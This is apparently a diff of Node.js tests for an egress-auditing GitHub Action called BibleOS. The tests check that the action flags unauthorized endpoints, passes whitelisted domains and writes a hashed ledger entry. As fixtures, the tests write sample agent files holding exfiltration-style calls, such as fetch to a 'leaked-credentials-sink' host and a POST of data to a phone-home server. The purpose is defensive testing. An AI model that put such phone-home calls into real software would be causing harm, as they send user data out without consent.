@@ -1,111 +1,93 @@
-import assert from 'node:assert';
-import fs from 'node:fs';
-import os from 'node:os';
-import path from 'node:path';
 import test from 'node:test';
+import assert from 'node:assert/strict';
+import fs from 'node:fs';
+import path from 'node:path';
+import os from 'node:os';
 import { runAudit } from '../src/index.js';
-import { scanFileContent } from '../src/scanner.js';
+import { scanDirectory } from '../src/scanner.js';
 
-test('Action Scanner: Detects unauthorized egress calls and literal endpoints', () => {
-	const snippet = `
-		import axios from 'axios';
-		const localUrl = 'http://localhost:3000/api';
-		const externalApi = 'https://unauthorized-phone-home.org/track';
-
-		export async function send() {
-			await fetch('https://unauthorized-phone-home.org/track');
-			await axios.get('https://telemetry-sink.net/event');
+test('BibleOS Action: Fully compliant directory passes audit with Reality Ledger chain', async () => {
+	const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bibleos-action-clean-'));
+	const sampleFile = path.join(tempDir, 'agent.js');
+	fs.writeFileSync(sampleFile, `
+		export function runLocalAgent(input) {
+			const res = { processed: true, value: input * 2 };
+			return res;
 		}
-	`;
+	`);
 
-	const { detections, violations } = scanFileContent('agent.js', snippet, []);
-	assert.ok(detections.length >= 3, 'Should detect external endpoints');
-	assert.strictEqual(violations.length, 3, 'Should flag 3 unauthorized violations');
-
-	const hosts = violations.map((v) => v.host);
-	assert.ok(hosts.includes('unauthorized-phone-home.org'));
-	assert.ok(hosts.includes('telemetry-sink.net'));
-});
-
-test('Action Scanner: Allows whitelisted endpoints and exempts localhost', () => {
-	const snippet = `
-		const schema = 'https://schema.org/Person';
-		const local = 'http://127.0.0.1:8080/health';
-		const permitted = 'https://api.openai.com/v1/chat/completions';
-		fetch('https://api.openai.com/v1/chat/completions');
-	`;
-
-	const { violations } = scanFileContent('safe.js', snippet, ['api.openai.com']);
-	assert.strictEqual(violations.length, 0, 'Whitelisted and exempt hosts must produce zero violations');
-});
-
-test('Action Runner: End-to-end audit with Reality Ledger cryptographic proof', async () => {
-	const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bibleos-action-test-'));
-	const sampleFile = path.join(tempDir, 'sample-agent.js');
 	const ledgerFile = path.join(tempDir, 'test-ledger.json');
+	const audit = await runAudit({
+		targetPath: tempDir,
+		strictMode: true,
+		generateLedger: true,
+		ledgerOutput: ledgerFile
+	});
 
-	fs.writeFileSync(
-		sampleFile,
-		`console.log("Safe agent without network access");`,
-		'utf8'
-	);
+	assert.equal(audit.success, true);
+	assert.equal(audit.scanResult.violations.length, 0);
+	assert.ok(audit.ledgerEntry);
+	assert.ok(audit.ledgerEntry.entry_hash);
+	assert.equal(audit.ledgerEntry.result.status, 'PASSED');
 
-	try {
-		const res = await runAudit({
-			targetPath: tempDir,
-			strictMode: true,
-			allowedEndpoints: [],
-			generateLedger: true,
-			ledgerOutput: ledgerFile,
-			quiet: true
-		});
+	// Verify ledger file was created and is valid JSON
+	assert.ok(fs.existsSync(ledgerFile));
+	const content = fs.readFileSync(ledgerFile, 'utf8').trim();
+	const parsed = JSON.parse(content);
+	assert.equal(parsed.entry_hash, audit.ledgerEntry.entry_hash);
 
-		assert.strictEqual(res.success, true);
-		assert.strictEqual(res.auditStatus, 'PASSED');
-		assert.strictEqual(res.violations.length, 0);
-		assert.ok(res.ledgerEntry.entry_hash);
-		assert.strictEqual(res.ledgerIntegrity.valid, true);
-
-		assert.ok(fs.existsSync(ledgerFile), 'Ledger file should be created');
-		const persisted = JSON.parse(fs.readFileSync(ledgerFile, 'utf8').trim());
-		assert.strictEqual(persisted.entry_hash, res.ledgerEntry.entry_hash);
-	} finally {
-		fs.rmSync(tempDir, { recursive: true, force: true });
-	}
+	// Cleanup
+	fs.rmSync(tempDir, { recursive: true, force: true });
 });
 
-test('Action Runner: Strict mode failure when egress violation detected', async () => {
-	const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bibleos-violation-test-'));
-	const sampleFile = path.join(tempDir, 'leaky-agent.js');
+test('BibleOS Action: Detects unauthorized external endpoint and fails under strict mode', async () => {
+	const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bibleos-action-breach-'));
+	const breachFile = path.join(tempDir, 'telemetry.js');
+	fs.writeFileSync(breachFile, `
+		export async function sendTelemetry(data) {
+			const url = "https://unauthorized-phone-home-server.org/collect";
+			return fetch(url, { method: "POST", body: JSON.stringify(data) });
+		}
+	`);
 
-	fs.writeFileSync(
-		sampleFile,
-		`fetch('https://leaked-credentials-sink.com/exfiltrate');`,
-		'utf8'
-	);
+	const audit = await runAudit({
+		targetPath: tempDir,
+		strictMode: true,
+		generateLedger: false
+	});
 
-	try {
-		const resStrict = await runAudit({
-			targetPath: tempDir,
-			strictMode: true,
-			allowedEndpoints: [],
-			generateLedger: false,
-			quiet: true
-		});
-		assert.strictEqual(resStrict.success, false);
-		assert.strictEqual(resStrict.auditStatus, 'VIOLATIONS_DETECTED');
-		assert.strictEqual(resStrict.violations.length, 1);
+	assert.equal(audit.success, false);
+	assert.ok(audit.scanResult.violations.length >= 1);
+	assert.equal(audit.scanResult.isCompliant, false);
 
-		const resPermissive = await runAudit({
-			targetPath: tempDir,
-			strictMode: false,
-			allowedEndpoints: [],
-			generateLedger: false,
-			quiet: true
-		});
-		assert.strictEqual(resPermissive.success, true);
-		assert.strictEqual(resPermissive.auditStatus, 'VIOLATIONS_DETECTED');
-	} finally {
-		fs.rmSync(tempDir, { recursive: true, force: true });
-	}
+	const violation = audit.scanResult.violations.find((v) => v.target.includes('unauthorized-phone-home-server.org'));
+	assert.ok(violation);
+	assert.equal(violation.type, 'UNAUTHORIZED_ENDPOINT');
+
+	// Cleanup
+	fs.rmSync(tempDir, { recursive: true, force: true });
+});
+
+test('BibleOS Action: Allows whitelisted domains and wildcards', async () => {
+	const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bibleos-action-whitelist-'));
+	const agentFile = path.join(tempDir, 'task.js');
+	fs.writeFileSync(agentFile, `
+		export async function queryAllowed(query) {
+			const endpoint = "https://api.agentuniver.com/v1/jobs";
+			return endpoint;
+		}
+	`);
+
+	const audit = await runAudit({
+		targetPath: tempDir,
+		strictMode: true,
+		allowedEndpoints: ['*.agentuniver.com'],
+		generateLedger: false
+	});
+
+	assert.equal(audit.success, true);
+	assert.equal(audit.scanResult.violations.length, 0);
+
+	// Cleanup
+	fs.rmSync(tempDir, { recursive: true, force: true });
 });
